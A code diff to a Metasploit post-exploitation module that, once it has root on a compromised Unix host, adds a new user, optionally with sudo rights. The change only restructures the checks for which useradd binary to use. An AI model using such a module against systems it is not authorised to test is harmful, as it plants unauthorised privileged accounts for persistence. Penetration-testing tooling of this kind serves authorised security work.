@@ -54,8 +54,13 @@ class MetasploitModule < Msf::Post
 
   def run
     fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
-    fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless datastore['UseraddBinary'] == 'MANUAL' || (datastore['UseraddBinary'] && command_exists?(datastore['UseraddBinary'])) || command_exists?('useradd') || command_exists?('adduser')
-    fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") if datastore['UseraddBinary'] && !(datastore['UseraddBinary'] == 'MANUAL' || command_exists?(datastore['UseraddBinary']))
+    unless datastore['UseraddBinary'] == 'MANUAL'
+      if datastore['UseraddBinary']
+        fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless command_exists?(datastore['UseraddBinary'])
+      else
+        fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless command_exists?('useradd') || command_exists?('adduser')
+      end
+    end
     fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
     fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless command_exists?(datastore['SHELL'])
     fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/
